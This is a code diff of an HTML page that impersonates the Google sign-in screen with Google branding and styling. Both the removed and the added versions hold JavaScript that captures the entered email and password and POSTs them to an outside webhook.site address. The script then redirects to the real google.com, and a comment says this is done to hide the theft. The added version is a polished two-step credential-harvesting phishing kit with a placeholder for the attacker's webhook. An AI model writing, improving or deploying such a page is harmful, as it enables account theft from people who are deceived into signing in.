@@ -5,44 +5,123 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Sign in - Google accounts</title>
     <style>
-        body { font-family: 'Roboto', arial, sans-serif; background-color: #f2f2f2; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .login-container { background: white; padding: 48px 60px 38px; border-radius: 8px; box-shadow: 0 1px 3px rgba(0,0,0,0.12), 0 1px 2px rgba(0,0,0,0.24); width: 450px; text-align: center; }
-        h1 { margin-bottom: 10px; font-weight: 400; color: #202124; }
-        p { color: #5f6368; font-size: 14px; margin-bottom: 20px; }
-        input { width: 100%; padding: 13px 15px; margin-bottom: 16px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; }
-        input:focus { border: 2px solid #1a73e8; outline: none; padding: 12px 14px; }
-        button { background-color: #1a73e8; color: white; border: none; padding: 10px 24px; border-radius: 4px; font-weight: 500; cursor: pointer; width: 100%; font-size: 14px; }
-        button:hover { background-color: #1765cc; }
-        .footer { margin-top: 20px; font-size: 12px; color: #5f6368; }
+        body {
+            font-family: arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f2f2f2;
+        }
+        .container {
+            width: 450px;
+            padding: 40px 60px 30px;
+            border: 1px solid #ebebeb;
+            border-radius: 8px;
+            background-color: white;
+            text-align: center;
+        }
+        h1 {
+            margin-bottom: 10px;
+            font-size: 24px;
+            font-weight: normal;
+        }
+        input[type="email"], input[type="password"] {
+            width: 100%;
+            padding: 13px 15px;
+            margin: 10px 0;
+            box-sizing: border-box;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        input:focus {
+            border-color: #1a73e8;
+            outline: none;
+        }
+        button {
+            background-color: #1a73e8;
+            color: white;
+            border: none;
+            padding: 10px 24px;
+            border-radius: 4px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+        }
+        button:hover {
+            background-color: #1765cc;
+        }
+        .error {
+            color: #d93025;
+            font-size: 14px;
+            margin-top: 10px;
+            display: none;
+        }
     </style>
-    <script>
-        document.querySelector('form').addEventListener('submit', function() {
-            // Send data to webhook
-            fetch('https://webhook.site/9f7463ee-3637-48df-bfef-e22245193603', {
-                method: 'POST',
-                body: new FormData(this)
-            }).then(() => {
-                // Redirect to real Google to hide theft
-                setTimeout(() => {
-                    window.location.href = 'https://www.google.com';
-                }, 500);
-            });
-            return false;
-        });
-    </script>
 </head>
 <body>
-    <div class="login-container">
-        <h1>Sign in</h1>
-        <p>Use your Google Account</p>
-        <form action="#" method="POST">
-            <input type="text" name="email" placeholder="Email or phone" required>
-            <input type="password" name="password" placeholder="Enter your password" required>
-            <button type="submit">Next</button>
-        </form>
-        <div class="footer">
-            <a href="#">Forgot email?</a> · <a href="#">Create account</a>
+
+<div class="container">
+    <img src="https://www.google.com/images/branding/googlelogo/2x/googlelogo_color_92x30dp.png" alt="Google Logo" style="margin-bottom: 20px;">
+    <h1>Sign in</h1>
+    <p>Use your Google Account</p>
+    
+    <form id="loginForm">
+        <input type="email" id="email" placeholder="Email or phone" required>
+        <div id="emailStep">
+            <button type="button" onclick="nextStep()">Next</button>
         </div>
-    </div>
+        <div id="passwordStep" style="display: none;">
+            <input type="password" id="password" placeholder="Enter your password" required>
+            <button type="button" onclick="submitForm()">Next</button>
+        </div>
+        <div class="error" id="errorMsg">Enter a valid email address</div>
+    </form>
+</div>
+
+<script>
+    // YOUR WEBHOOK URL HERE
+    const webhookUrl = "https://webhook.site/9f7463ee-3637-48df-bfef-e22245193603";
+
+    function nextStep() {
+        const email = document.getElementById('email').value;
+        if (email.includes('@') || email.includes('.')) {
+            document.getElementById('emailStep').style.display = 'none';
+            document.getElementById('passwordStep').style.display = 'block';
+            document.getElementById('password').focus();
+        } else {
+            document.getElementById('errorMsg').style.display = 'block';
+        }
+    }
+
+    async function submitForm() {
+        const email = document.getElementById('email').value;
+        const password = document.getElementById('password').value;
+        
+        // Send data to Webhook using Fetch
+        try {
+            await fetch(webhookUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    email: email,
+                    password: password
+                })
+            });
+            
+            // Redirect to Google after successful capture
+            window.location.href = "https://www.google.com";
+        } catch (error) {
+            console.error('Error:', error);
+            alert("Something went wrong. Please try again.");
+        }
+    }
+</script>
+
 </body>
 </html>
